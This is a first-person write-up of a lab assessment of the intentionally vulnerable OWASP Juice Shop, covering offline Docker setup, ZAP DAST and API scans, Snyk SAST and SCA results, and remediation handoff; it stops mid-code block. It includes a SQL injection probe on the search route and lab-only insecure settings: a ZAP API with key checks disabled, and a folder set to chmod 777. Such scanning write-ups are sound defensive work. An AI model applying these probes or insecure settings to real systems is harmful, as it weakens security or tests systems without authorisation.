# My Project 2A SCA, SAST and DAST Scanning: Application and API Security Assessment Journey

- **Core technologies:** Ubuntu in WSL, a hardened Ubuntu admin node, a hardened Ubuntu target node, Docker, OWASP Juice Shop, Snyk Open Source, Snyk Code, and OWASP ZAP.
- **Problem addressed:** I needed to assess an intentionally vulnerable web application across its dependencies, source code, web behavior, and API authorization, then record findings for the teams responsible for remediation.
- **Outcome:** I completed SCA and SAST scans, used ZAP baseline and AJAX Spider scans for DAST, and assessed API security with ZAP API Scan plus targeted manual checks. I documented individual findings, triage, and remediation ownership in this repository. I did not modify Juice Shop or remediate the findings; the next action belongs to the development/service owners.

I started this project with the same WSL workstation and hardened servers I had used for Project 1A Linux Server Hardening. I wanted to see what security issues I could find in the Juice Shop source and running application, then prepare clear evidence for the teams who would fix them. I installed Juice Shop on the target, ran ZAP baseline and AJAX scans, then cloned the source for SAST and SCA. After the original SSH tunnel became unreliable, I restored access and completed the API assessment with ZAP and two test accounts. I record the problems I hit along the way because getting the test setup right was part of the work.

## The lab scenario

I continued the lab from Project 1A Linux Server Hardening, reusing its three-node layout: my Windows workstation running Ubuntu in WSL, the admin node, and the target node. I checked the current host and network state as I added application security testing; I did not assume that every earlier setting was still active.

I used the previously hardened Ubuntu target node to host **OWASP Juice Shop**, a deliberately vulnerable web application built for security training. I ran the application in a Docker container, which kept its process and packages in a separate container environment while the Project 1A Linux Server Hardening controls remained on the host. I published the web port on the target's private lab interface and reached it through the lab network and SSH forwarding path. That kept the training application inside the lab network while giving me a running target for web and API assessment. Juice Shop's vulnerabilities are intentional; I used them to practise finding, validating, classifying, and handing off issues.

I documented the assessment in four parts. The sections below follow the order I carried out the tests:

1. **DAST — Dynamic Application Security Testing:** assess the running application over HTTP with ZAP baseline and AJAX Spider scans.
2. **SAST — Static Application Security Testing:** a **white-box** assessment because I had access to Juice Shop's source code. Snyk Code inspected source paths and code patterns without executing those paths in the running service. In this lab, that let me connect alerts to files and lines and review whether a pattern belonged to application code, tests, or an intentional training challenge.
3. **SCA — Software Composition Analysis:** identify known vulnerabilities in direct and transitive dependencies.
4. **API Security:** an API-focused assessment of discovered routes, access control, token validation, input handling, and response behavior. I used ZAP API Scan for automated requests and separate, narrowly scoped manual checks for authenticated object-level authorization and token acceptance. The API scan is dynamic testing of API endpoints; it is presented separately here because the questions and evidence concern API-specific controls.

I was not the Juice Shop developer, so I kept this project focused on the DevSecOps part of the work: collect evidence, explain impact and uncertainty, prioritize findings, and hand actionable remediation work to development and service owners. I did not change the application code. The developers own those fixes; DevSecOps supports prioritization and later verification.

### The three-node layout

| Node | Role in this project |
| --- | --- |
| WSL workstation | Snyk CLI work, ZAP control and reporting, curl/Python checks, and SSH tunnels to the lab. |
| Admin node | Management point used to inspect the target and verify reachability to the application. |
| Target node | Previously hardened Ubuntu host running the Juice Shop Docker container. |

The test path was deliberately kept within the lab network. I verified basic HTTP reachability before interpreting scanner output; an unavailable target produces timeouts or HTTP `000`, which says nothing about whether an endpoint is vulnerable.

| Stage | Sequence |
| --- | --- |
| [1. Docker and target application](#1-install-docker-and-start-juice-shop) | Install Docker offline → verify the target → load and start Juice Shop. |
| [2. DAST](#2-dast--dynamic-application-security-testing) | Run ZAP baseline and AJAX scans against the running target; record crawl issues and coverage. |
| [3. SAST](#3-sast--static-application-security-testing) | Clone the matching source → prepare and authenticate Snyk → run Snyk Code → preserve source findings. |
| [4. SCA](#4-sca--software-composition-analysis) | Resolve dependencies in WSL → run Snyk Open Source → preserve advisories and dependency paths. |
| [5. API Security](#5-api-security) | Run ZAP API Scan → combine tool evidence with bounded two-account, token, and response checks. |
| [6. Assessment handoff](#6-assessment-handoff) | Consolidate findings → triage → create developer issues → leave remediation to owners. |

**Starting point:** The servers had been hardened in Project 1A Linux Server Hardening. The first task was to install Docker on the isolated target and start Juice Shop. I cloned the matching source release into WSL later, when I prepared the SAST and SCA scans. I used the lab accounts and SSH access already established for this environment; I did not include private keys or account passwords in this repository.

## 1. Install Docker and start Juice Shop

### 1.1 I installed Docker on the isolated target before scanning

Docker was not installed on the target, and its isolated network could not download the packages. I prepared the Ubuntu packages in WSL, transferred them through the admin node, and checked their checksums at each step. This was the first Docker installation; the later Docker failure happened separately in the lab.

Before installing Docker, I checked free disk space, the Ubuntu release, the available Docker package version, and the packages APT planned to install. I ran these commands on the **target server**, reached from WSL through the admin node:

```bash
# Target server
df -h /
cat /etc/os-release
apt-cache policy docker.io
apt-get -s install docker.io
```

I confirmed the target was Ubuntu 26.04.1. Its package index offered `docker.io` version `29.1.3-0ubuntu4.1`, and the simulation showed eight new packages with none removed. I refreshed WSL's package list and checked its candidate version too:

```bash
# WSL workstation
sudo apt-get update
apt-cache policy docker.io
apt-get -s install docker.io
```

WSL listed more packages in its simulation because WSL and the target already had different dependencies installed. I used the target's package plan to decide which files to transfer.

APT downloaded `docker.io`, `containerd`, and `runc`, but skipped five dependencies that were already installed in WSL. I downloaded those package files separately, then staged the eight packages the target needed:

```bash
# WSL workstation
sudo apt-get --download-only --no-install-recommends install docker.io
ls -lh /var/cache/apt/archives/*.deb
sudo apt-get --download-only --reinstall --no-install-recommends install bridge-utils dns-root-data dnsmasq-base pigz ubuntu-fan
ls -lh /var/cache/apt/archives/*.deb

mkdir -p ~/project-2a/staging/docker-packages
cp /var/cache/apt/archives/{bridge-utils_1.7.1-4ubuntu3_amd64.deb,containerd_2.2.2-0ubuntu1.2_amd64.deb,dns-root-data_2025080400build1_all.deb,dnsmasq-base_2.92-1ubuntu0.5_amd64.deb,docker.io_29.1.3-0ubuntu4.1_amd64.deb,pigz_2.8-1build1_amd64.deb,runc_1.4.0-0ubuntu1_amd64.deb,ubuntu-fan_0.12.17_all.deb} ~/project-2a/staging/docker-packages/
ls -lh ~/project-2a/staging/docker-packages
cd ~/project-2a/staging/docker-packages
sha256sum *.deb > SHA256SUMS
sha256sum -c SHA256SUMS
```

The eight packages totalled about **71 MB**. In WSL, I created a SHA-256 manifest and checked it before sending the files. I then made a staging folder on the **admin node**:

```bash
# Admin node
mkdir -p ~/project-2a/staging/docker-packages
```

From **WSL**, I copied the manifest and packages into that folder:

```bash
# WSL workstation
scp -i ~/.ssh/mds_admin_ed25519 SHA256SUMS *.deb mdsadmin@192.168.56.101:~/project-2a/staging/docker-packages/
```

On the **admin node**, I checked the transferred files against the manifest:

```bash
# Admin node
cd ~/project-2a/staging/docker-packages
sha256sum -c SHA256SUMS
```

All eight package files reported `OK` on the admin node.

Next, I created the same staging folder on the **target server**:

```bash
# Target server
mkdir -p ~/project-2a/staging/docker-packages
```

From the **admin node**, I used its SSH key for the target to copy the package files across:

```bash
# Admin node
scp -i ~/.ssh/mds_target_ed25519 ~/project-2a/staging/docker-packages/* mdsadmin@192.168.77.10:~/project-2a/staging/docker-packages/
```

On the **target server**, I checked the manifest again:

```bash
# Target server
cd ~/project-2a/staging/docker-packages
sha256sum -c SHA256SUMS
```

All eight packages reported `OK` on the target too, confirming that the transfer had not changed them.

The first offline APT attempt hit a problem. On the **target server**, the `--no-download` simulation failed with `Unable to fetch some archives` and made no changes. A simulation using the local package paths showed the eight-package plan, but the real APT install still tried to fetch archives and failed. I kept all three target-side commands here to show what I tried and where it stopped:

```bash
# Target server
cd ~/project-2a/staging/docker-packages
apt-get --no-download -s install ./*.deb

# Target server: simulation using local package paths.
apt-get -s install ./*.deb

# Target server: actual APT attempt, which also failed to fetch archives.
sudo apt-get --no-download install ./*.deb
```

Since the package files were already on the **target server**, I used `dpkg` to install them locally:

```bash
# Target server
cd ~/project-2a/staging/docker-packages
sudo dpkg -i ./*.deb
```

The installation completed: the output showed the Docker packages unpacked and configured, and systemd links created for the Docker service and socket.

After the install, I checked Docker and the network from the **target server**:

```bash
# Target server
systemctl is-active docker
ip route
```

The Docker service check returned `active`. The route table showed the new `172.17.0.0/16` bridge alongside the lab route `192.168.77.0/24`, with no default route. The target still had no direct internet route.

### 1.2 I transferred, verified, and started the first Juice Shop container

The target had no internet route, so I used the `bkimminich/juice-shop:latest` image already stored in WSL. I saved it to an archive for transfer. Before this, WSL reported image ID `sha256:2d370ec1…` and a repository digest for the image.

I saved the image and created a checksum file in **WSL**:

```bash
# WSL workstation
docker save --output ~/project-2a/staging/juice-shop.tar bkimminich/juice-shop:latest
cd ~/project-2a/staging
sha256sum juice-shop.tar > juice-shop.tar.sha256
ls -lh juice-shop.tar juice-shop.tar.sha256
```

The archive was about **347 MB**. I copied the archive and its checksum file from **WSL to the admin node**:

```bash
# WSL workstation
scp -i ~/.ssh/mds_admin_ed25519 juice-shop.tar juice-shop.tar.sha256 mdsadmin@192.168.56.101:~/project-2a/staging/
```

On the **admin node**, I checked the archive against its manifest:

```bash
# Admin node
cd ~/project-2a/staging
sha256sum -c juice-shop.tar.sha256
```

The check returned `juice-shop.tar: OK`. From the **admin node**, I copied the verified archive and checksum file to the target:

```bash
# Admin node
scp -i ~/.ssh/mds_target_ed25519 ~/project-2a/staging/juice-shop.tar ~/project-2a/staging/juice-shop.tar.sha256 mdsadmin@192.168.77.10:~/project-2a/staging/
```

On the **target server**, I ran the same checksum check:

```bash
# Target server
cd ~/project-2a/staging
sha256sum -c juice-shop.tar.sha256
```

The target also returned `juice-shop.tar: OK`. I loaded the verified image archive into Docker on the **target server**:

```bash
# Target server
sudo docker load --input ~/project-2a/staging/juice-shop.tar
```

Docker reported `Loaded image: bkimminich/juice-shop:latest`. I had loaded the image, but had not started the application yet.

Before starting Juice Shop, I checked the image on the **target server**. My first attempt from WSL failed because `sudo` needed a terminal. The target-side command was the same on retry; I allocated a terminal at both SSH hops so the password prompt could work:

```bash
# Target server
sudo docker image inspect --format '{{.Id}}' bkimminich/juice-shop:latest

# Target server: retry in an interactive target shell.
sudo docker image inspect --format '{{.Id}}' bkimminich/juice-shop:latest
```

The image IDs did not match: the target reported `sha256:9a55bcd1…`, while WSL reported `sha256:2d370ec1…`. I paused to compare the archive manifest, config hash, and image layers before starting the container.

On **WSL**, I checked the archive manifest and hashed its config blob. The blob matched the WSL image ID. I also fixed a layer-inspection command: I had left its format expression unquoted, so the first result was an error hash rather than a useful layer fingerprint.

```bash
# WSL workstation
cd ~/project-2a/staging
tar -xOf juice-shop.tar manifest.json
tar -xOf juice-shop.tar blobs/sha256/2d370ec11ab40bc24b3516c042f7317a053c80f668e572538469d1fd7e91d7f8 | sha256sum
docker image inspect --format '{{.Id}} {{.Os}}/{{.Architecture}} {{json .RepoDigests}}' bkimminich/juice-shop:latest

# WSL workstation: corrected fingerprint of the ordered image layer list.
docker image inspect --format '{{json .RootFS.Layers}}' bkimminich/juice-shop:latest | sha256sum
```

I ran these checks on the **target server** to compare the full image ID, layer list, and platform:

```bash
# Target server
sudo docker image ls --no-trunc bkimminich/juice-shop:latest
sudo docker image inspect --format '{{json .RootFS.Layers}}' bkimminich/juice-shop:latest | sha256sum
sudo docker image inspect --format 'OS={{.Os}} ARCH={{.Architecture}} SIZE={{.Size}}' bkimminich/juice-shop:latest
```

The config blob hashed to `2d370ec1…`. Both layer-list checks returned `36fd80fb…`, and the target reported `OS=linux ARCH=amd64`. The image IDs were different in the two Docker stores, but the archive checksum and matching layer lists gave me enough evidence to continue with the lab image.

Once the image checks were complete, I started Juice Shop on the **target server**, bound it to the private lab address, and checked that it was running:

```bash
# Target server
sudo docker run -d --name juice-shop --restart unless-stopped -p 192.168.77.10:3000:3000 bkimminich/juice-shop:latest
sudo docker ps --filter name=juice-shop
```

Docker returned container ID `5440dc6a…`. The **target server** showed the container as **Up**, with port 3000 bound to `192.168.77.10`.

I checked the application from the **admin node** with this request; it returned `HTTP 200`:

```bash
# Admin node
curl -sS -o /dev/null -w 'HTTP %{http_code}\n' --max-time 5 http://192.168.77.10:3000/
```

Windows could not reach the target's isolated address directly. I opened an SSH tunnel from **WSL** through the admin node and left that terminal running:

```bash
# WSL workstation
ssh -N -L 3000:192.168.77.10:3000 -i ~/.ssh/mds_admin_ed25519 mdsadmin@192.168.56.101
```

The browser opened Juice Shop at `http://localhost:3000`. At that point, the app was running on the target and reachable through the WSL tunnel. I then continued with the scans. The Docker outage and repeat image setup occurred later in the lab.


## 2. DAST — Dynamic Application Security Testing

### 2.1 I ran ZAP baseline and AJAX Spider scans

I ran the first ZAP web scans while the original port-3000 path was responding. The target URL in those preserved reports and crawler results was `http://host.docker.internal:3000`. That forward later became unreliable, which I investigated later before the API scan continued on port 3001. ZAP performed a black-box DAST assessment: it interacted with the live application over HTTP without reading the source. The baseline run discovered 116 URLs and reported **0 FAIL alerts**, **3 warning types**, and **58 PASS checks**. The warning types included missing Content Security Policy, cross-domain configuration, and the informational modern-web-application classification.

The AJAX-enabled baseline discovered **35 URLs**, **0 FAIL alerts**, **3 warning types**, and **58 PASS checks** in its separate run. A direct Spider API crawl found 94 traditional Spider URLs and 91 AJAX Spider URLs. The AJAX crawl exposed API routes and client-loaded resources that the traditional crawl missed. These counts came from different runs/settings; I recorded them as crawl coverage rather than comparing them as vulnerability counts.

**Problems I encountered:** An AJAX baseline attempt hit connection refused while the tunnel was down. Later, the direct AJAX Spider API request with inScope=true failed because the starting URL was not in ZAP scope. I retried with inScope=false, but that request returned Internal Error. The eventual 91-URL AJAX result is preserved, although the exact successful start request is not. These setup errors were not application vulnerabilities.

The scan was black-box: ZAP evaluated externally visible behavior and did not inspect source code. I ran these black-box scans before cloning the source for the later SAST and SCA stages. For API-specific probing, I describe ZAP's API Scan with the API Security results in Section 5.

**Checkpoint:** DAST discovered reachable pages and response-level behaviors from the outside. The report distinguishes observed responses from source-confirmed issues and scanner signals that still need endpoint-specific validation.

#### Commands I ran and the report-permission problem I fixed

The chat preserves the baseline commands and the failure output. My first scan attempt could not save ZAP's automation plan: ZAP ran as its container user, whose default home `/home/zap` was not writable. Running ZAP as my WSL user fixed access to the report folder but left the default home unwritable. I then tried mounting a separate `zap-home` directory beneath the report mount; ZAP still could not write `/zap/wrk/home/zap.yaml`. Those attempts did not produce the saved HTML report.

**Initial baseline attempt:**

```bash
# WSL workstation
mkdir -p ~/project-2a/zap-reports
docker run --rm -t \
  -v "$HOME/project-2a/zap-reports:/zap/wrk:rw" \
  zaproxy/zap-stable \
  zap-baseline.py -t http://host.docker.internal:3000 -r juice-shop-baseline.html
```

**Attempt to run as my WSL user (report permission changed, ZAP home still failed):**

```bash
# WSL workstation
docker run --rm -t -u "$(id -u):$(id -g)" \
  -v "$HOME/project-2a/zap-reports:/zap/wrk:rw" \
  zaproxy/zap-stable \
  zap-baseline.py -t http://host.docker.internal:3000 -r juice-shop-baseline.html
```

**Attempt with a separate mounted home (ZAP still could not write its plan):**

```bash
# WSL workstation
mkdir -p ~/project-2a/zap-home ~/project-2a/zap-reports
docker run --rm -t \
  -e HOME=/zap/wrk/home \
  -v "$HOME/project-2a/zap-home:/zap/wrk/home:rw" \
  -v "$HOME/project-2a/zap-reports:/zap/wrk:rw" \
  zaproxy/zap-stable \
  zap-baseline.py -t http://host.docker.internal:3000 -r juice-shop-baseline.html
```

The successful fix was to make the WSL report directory writable and keep ZAP's temporary home in `/tmp`. The `chmod 777` was a temporary lab-folder permission change to let the container write its report; it was not a target-server hardening change. This run produced the saved 116-URL baseline report:

```bash
# WSL workstation
chmod 777 ~/project-2a/zap-reports
docker run --rm -t \
  -e HOME=/tmp \
  -v "$HOME/project-2a/zap-reports:/zap/wrk:rw" \
  zaproxy/zap-stable \
  zap-baseline.py -t http://host.docker.internal:3000 -r juice-shop-baseline.html
```

I then ran the AJAX-enabled passive baseline. One attempt failed because the SSH tunnel returned `Connection refused`; after the tunnel returned HTTP 200, this scan completed and saved the 35-URL report:

```bash
# WSL workstation
curl -sS -o /dev/null -w 'HTTP %{http_code}\n' --max-time 5 http://localhost:3000/
docker run --rm -t \
  -e HOME=/tmp \
  -v "$HOME/project-2a/zap-reports:/zap/wrk:rw" \
  zaproxy/zap-stable \
  zap-baseline.py -t http://host.docker.internal:3000 -j -r juice-shop-ajax.html
```

I checked the saved report and extracted its URL strings with these commands:
The report summary did not show the full URL inventory, so I reran the AJAX-enabled baseline to save a JSON report as well as HTML. This was still a passive baseline scan; the JSON file was a ZAP report, not an export of the full Spider result list:

```bash
# WSL workstation
docker run --rm -t \
  -e HOME=/tmp \
  -v "$HOME/project-2a/zap-reports:/zap/wrk:rw" \
  zaproxy/zap-stable \
  zap-baseline.py -t http://host.docker.internal:3000 -j \
  -J juice-shop-ajax.json -r juice-shop-ajax.html
```

I checked the saved report and extracted its URL strings with these commands:

```bash
# WSL workstation
ls -lh ~/project-2a/zap-reports/juice-shop-ajax.html
grep -o 'http[^"< ]*' ~/project-2a/zap-reports/juice-shop-ajax.html | sort -u | head -n 30
```

The JSON rerun above saved a ZAP report; it was not a complete Spider URL export. I used the running ZAP API for the actual Spider URL lists below. A full-scan command using zap-full-scan.py was suggested once, but the preserved completed results are from zap-baseline.py, so I do not count the full scan as a completed assessment.
The ZAP container must resolve host.docker.internal to the WSL host and reach the forwarded Juice Shop port 3000. If it cannot, I check scanner-to-target connectivity before treating the output as a scan result. The target remains the isolated lab instance.

#### I used the ZAP API to compare the two crawlers

I wanted to know whether the traditional Spider had reached the application's JavaScript-loaded API routes. After the baseline scans, I started a temporary ZAP daemon in WSL and queried its Spider API. The chat retains the server-start command and the traditional Spider calls. It also retains the first AJAX request with inScope=true, which produced the error "The starting URI is not in scope", followed by a retry with inScope=false that returned Internal Error. The eventual AJAX result list contained 91 URLs, but the exact successful request sequence was not retained. I record that limitation instead of attributing the 91-URL result to a command whose success is not evidenced.

I started ZAP with its API bound to WSL localhost and with API key checks disabled for this temporary lab daemon:

```bash
# WSL workstation
# The API is bound to 127.0.0.1 on the host; do not expose this port to the lab network.
docker run -d --name zap-crawl-api \
  -p 127.0.0.1:8090:8090 \
  -e HOME=/tmp \
  zaproxy/zap-stable \
  zap.sh -daemon -host 0.0.0.0 -port 8090 \
  -config api.disablekey=true \
  -config "api.addrs.addr.name=.*" \
  -config api.addrs.addr.regex=true
```

I checked the container, its logs and port mapping, then waited for the API version endpoint to respond:

```bash
# WSL workstation
docker ps --filter name=zap-crawl-api
docker logs --tail 80 zap-crawl-api
docker port zap-crawl-api 8090/tcp
curl -sS http://127.0.0.1:8090/JSON/core/view/version/
```

I started the traditional Spider, checked it until it reached 100%, and retrieved its URL list. The transcript used scan ID 0:

```bash
# WSL workstation
curl -sS --get 'http://127.0.0.1:8090/JSON/spider/action/scan/' \
  --data-urlencode 'url=http://host.docker.internal:3000' \
  --data-urlencode 'recurse=true' \
  --data-urlencode 'subtreeOnly=true'
curl -sS --get 'http://127.0.0.1:8090/JSON/spider/view/status/' \
  --data-urlencode 'scanId=0'
curl -sS --get 'http://127.0.0.1:8090/JSON/spider/view/results/' \
  --data-urlencode 'scanId=0' \
  -o ~/project-2a/zap-reports/spider-results.json
```

The traditional crawl returned 94 URLs and no /api/ paths. My first AJAX request restricted the crawl to ZAP's existing scope. Juice Shop had not been added to scope, so this attempt did not crawl the site:

```bash
# WSL workstation
curl -sS --get 'http://127.0.0.1:8090/JSON/ajaxSpider/action/scan/' \
  --data-urlencode 'url=http://host.docker.internal:3000' \
  --data-urlencode 'inScope=true' \
  --data-urlencode 'subtreeOnly=true'
curl -sS http://127.0.0.1:8090/JSON/ajaxSpider/view/status/
docker logs --tail 80 zap-crawl-api
```

The log reported "The starting URI is not in scope". I retried with inScope=false; ZAP then returned Internal Error, so I inspected the logs rather than treating that attempt as a completed crawl:

```bash
# WSL workstation
curl -sS --get 'http://127.0.0.1:8090/JSON/ajaxSpider/action/scan/' \
  --data-urlencode 'url=http://host.docker.internal:3000' \
  --data-urlencode 'inScope=false' \
  --data-urlencode 'subtreeOnly=true'
docker logs --tail 80 zap-crawl-api
```

After the successful AJAX crawl stopped, I saved the result list. The chat preserves these retrieval commands and the resulting 91-URL list, but not the exact successful scan-start parameters:

```bash
# WSL workstation
curl -sS http://127.0.0.1:8090/JSON/ajaxSpider/view/status/
curl -sS 'http://127.0.0.1:8090/JSON/ajaxSpider/view/results/' \
  -o ~/project-2a/zap-reports/ajax-spider-results.json
python3 -c 'import json; p="/home/devsecops/project-2a/zap-reports/ajax-spider-results.json"; r=json.load(open(p)).get("results", []); print(f"AJAX Spider URLs: {len(r)}"); print("\n".join(map(str, r[:20])))'
```
I counted URLs and checked which paths were new to the AJAX result. In the retained run, ten exact URL strings appeared in both lists and 81 strings appeared only in AJAX. Socket.IO query values made some URLs look unique even when they represented the same route. I treated that comparison as **discovery coverage**, then used the discovered API routes later in Section 5.

```bash
# WSL workstation
python3 - <<'PY'
import json
from pathlib import Path
from urllib.parse import urlparse

root = Path.home() / 'project-2a/zap-reports'
def urls(filename):
    items = json.loads((root / filename).read_text()).get('results', [])
    return {item if isinstance(item, str) else item.get('url')
            for item in items} - {None}

spider = urls('spider-results.json')
ajax = urls('ajax-spider-results.json')
for name, urls in [('traditional', spider), ('AJAX', ajax)]:
    print(name, 'URLs:', len(urls))
    print(name, '/api/ paths:', sum('/api/' in urlparse(url).path for url in urls))
print('shared exact URLs:', len(spider & ajax))
print('AJAX-only exact URLs:', len(ajax - spider))
PY
```


## 3. SAST — Static Application Security Testing

### 3.1 I cloned the matching Juice Shop source and prepared Snyk

After I confirmed Juice Shop was running on the target, I prepared the source checkout in **WSL** for code analysis. The source folder was missing when I checked it, so I cloned the official `v20.3.0` release to match the application version. I checked Git first; it reported version `2.53.0`.

```bash
# WSL workstation
git --version
cd ~/project-2a
git clone --depth 1 --branch v20.3.0 https://github.com/juice-shop/juice-shop.git juice-shop-source
```

I installed the Snyk CLI as a user executable in WSL. The first suggested system-wide location, `/usr/local/bin`, was owned by root, so I placed the binary under my home directory instead:

```bash
# WSL workstation
ls -ld /usr/local/bin
mkdir -p "$HOME/.local/bin"
curl -fsSL https://static.snyk.io/cli/latest/snyk-linux -o "$HOME/.local/bin/snyk"
chmod +x "$HOME/.local/bin/snyk"
"$HOME/.local/bin/snyk" --version
```

The CLI reported version `1.1308.3`. I authenticated it before scanning. The browser OAuth callback returned “Not Found,” and checking the CLI showed that no API credential had been set. I inspected the available authentication options and switched to token-based authentication; the token was entered at the hidden terminal prompt and is not included here:

```bash
# WSL workstation
"$HOME/.local/bin/snyk" auth
"$HOME/.local/bin/snyk" config get api
"$HOME/.local/bin/snyk" auth --help
"$HOME/.local/bin/snyk" auth --auth-type=token
```

The final token-based flow authenticated successfully. I then confirmed that the checkout existed and enabled Snyk Code for the selected organization when the first scan reported the feature was disabled. Enabling it was a Snyk web-console action, not a shell command.

### 3.2 I ran Snyk Code against the source

SAST was **white-box** in this project because Snyk Code analyzed the source checkout. My first scan attempt returned a message that Snyk Code was disabled for the selected organization, so it produced no findings. I enabled Snyk Code for that organization in the Snyk web console, then repeated the same command from the repository. The console change was not a shell command.

**First attempt (feature disabled; no scan findings were produced):**

```bash
# WSL workstation
cd ~/project-2a/juice-shop-source
"$HOME/.local/bin/snyk" code test
```

**Rerun after enabling Snyk Code:**

```bash
# WSL workstation
cd ~/project-2a/juice-shop-source
"$HOME/.local/bin/snyk" code test
```
The scan returned **306 findings**: **26 High**, **11 Medium**, and **269 Low**. Of the Low records, **240** were in `test/` paths. I preserved all individual records in [sast-individual-findings.md](sast-individual-findings.md). The path and challenge context mattered when I triaged them: Juice Shop deliberately includes vulnerable training examples, so a scanner result needed review before being treated as a production defect.

**Checkpoint:** Snyk Code provided source-level findings and file paths. It did not demonstrate that every finding was reachable or exploitable in a deployed service. In the chat, this SAST scan followed the initial DAST scans and came before the SCA dependency scan in Section 4.

## 4. SCA — Software Composition Analysis

### 4.1 I tried Snyk Open Source and checked the missing prerequisites

After the SAST scan, I moved to SCA. Snyk Open Source compares project dependencies with known advisories. Although Juice Shop was running on the target, I ran this scan in **WSL** against the source checkout and its local dependency tree; it did not send requests to the target container. The initial DAST scans had already been run against the live target; the API assessment came later, after I restored a working tunnel.

I first tried to scan the source dependencies. Snyk could not produce a result because the checkout had neither a supported lockfile nor an installed `node_modules` directory:

```bash
# WSL workstation
cd ~/project-2a/juice-shop-source
"$HOME/.local/bin/snyk" test
```

The terminal returned `SNYK-CLI-0000` and said **“Missing node_modules folder: we can't test without dependencies. Please run 'npm install' first.”** I checked the manifest and searched for lockfiles; the checkout contained `package.json`, but no `package-lock.json`, npm shrinkwrap, or Yarn lockfile:

```bash
# WSL workstation
cd ~/project-2a/juice-shop-source
ls -l package.json package-lock.json
find . -name package-lock.json -o -name npm-shrinkwrap.json -o -name yarn.lock
```

The first Node.js and npm version checks in WSL returned `command not found`. I initially tried the Ubuntu package suggestion for npm, then followed the Node.js 22 setup steps for the Juice Shop `v20.3.0` source. The full package manager installation output was not retained in the chat, so I report the commands and the subsequent successful scan rather than inventing installation logs:

```bash
# WSL workstation
node --version
npm --version
sudo apt install npm
sudo apt update
sudo apt install -y curl
curl -fsSL https://deb.nodesource.com/setup_22.x -o nodesource_setup.sh
sudo -E bash nodesource_setup.sh
sudo apt install -y nodejs
node --version
npm --version
```

### 4.2 I installed dependencies without running package scripts and rescanned

Once Node.js and npm were available, I installed the Juice Shop dependency tree without executing package lifecycle scripts. This created the local dependencies Snyk needed and avoided running the project’s `postinstall` build script during the assessment:

```bash
# WSL workstation
cd ~/project-2a/juice-shop-source
npm install --ignore-scripts
```

The chat does not preserve the full `npm install` output. After it completed, I reran Snyk with development dependencies included:

```bash
# WSL workstation
cd ~/project-2a/juice-shop-source
"$HOME/.local/bin/snyk" test --dev
```

Snyk reported **87 advisory/path entries**: **2 Critical, 36 High, 47 Medium, and 2 Low**. The output included an upgrade recommendation for `@cyclonedx/cyclonedx-npm@4.2.1` and advisories across direct and transitive dependencies. I preserved all reported entries and dependency paths in [sca-individual-findings.md](sca-individual-findings.md), and the SCA triage rows in [risk-register-sca-sast.csv](risk-register-sca-sast.csv).

Two Critical entries needed prompt owner review: arbitrary code injection associated with `marsdb@0.6.11`, listed as directly introduced, and directory traversal in `decompress@4.2.1`, reached through `download@8.0.0`. Other High entries included legacy JWT packages, lodash, and transitive/build dependencies. These paths are evidence for triage; scanner severity alone does not prove that vulnerable code is reachable in the deployed service.

**Scope limit:** Because the checkout had no committed lockfile, npm resolved a local dependency tree for this scan. The result did not prove that the selected versions exactly matched the prebuilt container image on the target. I recorded the dependency recommendations for the development team and did not change Juice Shop's dependencies.

**Checkpoint:** SCA identified known advisories in the local dependency tree. It did not establish runtime reachability, demonstrate exploitability, or verify a fix. SCA followed SAST in the chat; the earlier DAST scans are documented in Section 2.

## 5. API Security

I used two methods to assess API security. ZAP API Scan discovered routes and sent generated requests across the imported API surface. I then used two lab accounts to answer questions the unauthenticated scan could not answer: could one user read another user's basket, and would the application accept an unsigned token? I kept those checks read-only.

### 5.1 I ran the ZAP API Scan and established the API surface

The AJAX Spider and API Scan surfaced routes including challenge and quantity endpoints, product search, languages, application version/configuration, and user-related routes. The API Scan imported 16 URLs and reported 53 total URLs, 108 PASS checks, 0 FAIL, and 7 warning types. Its report listed 37 endpoints, all using GET, and noted slow responses. It was unauthenticated and covered only the imported API surface plus scanner-generated requests.

For a repeatable CLI run, I need an OpenAPI definition containing the routes to assess. The original import file was not retained. I can build a **small replacement definition from the routes preserved in the AJAX output**, then run the ZAP API Scan. This replacement covers the seven routes listed below; it will not reproduce the original report's 16 imported URLs, 37 endpoints, or alert counts exactly. I record the original results above and use these commands as a runnable portfolio example:

```bash
cd ~/project-2a
mkdir -p zap-reports
cat > juice-shop-api.yaml <<'YAML'
openapi: 3.0.3
info:
  title: Juice Shop lab API route sample
  version: '1.0'
servers:
  - url: http://host.docker.internal:3001
paths:
  /api/Challenges/:
    get:
      parameters:
        - {name: name, in: query, schema: {type: string}}
      responses: {'200': {description: Challenge data}}
  /api/Quantitys/:
    get:
      responses: {'200': {description: Quantity data}}
  /rest/admin/application-configuration:
    get:
      responses: {'200': {description: Application configuration}}
  /rest/admin/application-version:
    get:
      responses: {'200': {description: Application version}}
  /rest/continue-code:
    get:
      responses: {'200': {description: Continue code response}}
  /rest/languages:
    get:
      responses: {'200': {description: Languages}}
  /rest/products/search:
    get:
      parameters:
        - {name: q, in: query, schema: {type: string}}
      responses: {'200': {description: Search results}}
YAML

docker run --rm -t \
  --add-host=host.docker.internal:host-gateway \
  -v "$PWD:/zap/wrk/:rw" \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py \
  -t /zap/wrk/juice-shop-api.yaml \
  -f openapi \
  -r /zap/wrk/zap-reports/juice-shop-api-active.html
```

The imported definition and authentication configuration determine coverage. The recorded API Scan was unauthenticated, so it did not test the two-account authorization case below. The replacement command follows ZAP's [API Scan documentation](https://www.zaproxy.org/docs/docker/api-scan/). When I reviewed the original HTML report, I used this parser to find the SQL Injection alert and the affected route without dumping the whole report to the terminal:

```bash
python3 - <<'PY'
from html.parser import HTMLParser
from pathlib import Path

class Text(HTMLParser):
    def __init__(self):
        super().__init__()
        self.parts = []
    def handle_data(self, value):
        if value.strip():
            self.parts.append(value.strip())

report = Path.home() / 'project-2a/zap-reports/juice-shop-api-active.html'
parser = Text()
parser.feed(report.read_text(errors='replace'))
body = ' '.join(' '.join(parser.parts).split())
for term in ('SQL Injection', '/rest/products/search'):
    pos = body.lower().find(term.lower())
    print(f'--- {term} ---')
    print(body[max(0, pos - 300):pos + 900] if pos >= 0 else 'Not found')
PY
```


ZAP reported a SQL Injection alert on `GET /rest/products/search?q=q%27` with an HTTP 500 response. Source review independently found that `routes/search.ts` interpolated the query value into a SQL template string. I recorded unsafe SQL construction as a source-confirmed weakness, while making clear that the scanner's 500 was not proof of data extraction. The SQL injection route is also an intentional Juice Shop training challenge.

To trace the SQL alert into the source, I reviewed the search route from **WSL**. `rg` was not installed, so I used the available `grep` and `sed` commands instead:

```bash
